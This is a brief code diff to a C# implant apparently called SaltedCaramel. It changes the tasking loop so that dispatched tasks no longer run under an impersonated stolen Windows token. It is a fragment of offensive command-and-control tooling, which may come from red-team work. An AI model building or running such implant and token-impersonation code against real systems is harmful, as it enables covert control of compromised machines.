@@ -37,6 +37,7 @@ namespace SaltedCaramel
                 SCTask task = implant.CheckTasking();
                 if (task.command != "none")
                 {
+                    /*
                     if (implant.hasAlternateToken() == true)
                     {
                         using (WindowsIdentity ident = new WindowsIdentity(Token.stolenHandle))
@@ -45,6 +46,8 @@ namespace SaltedCaramel
                     }
                     else
                         ThreadPool.QueueUserWorkItem((i) => task.DispatchTask(implant));
+                    */
+                    ThreadPool.QueueUserWorkItem((i) => task.DispatchTask(implant));
                 }
                 Thread.Sleep(implant.sleep);
             }
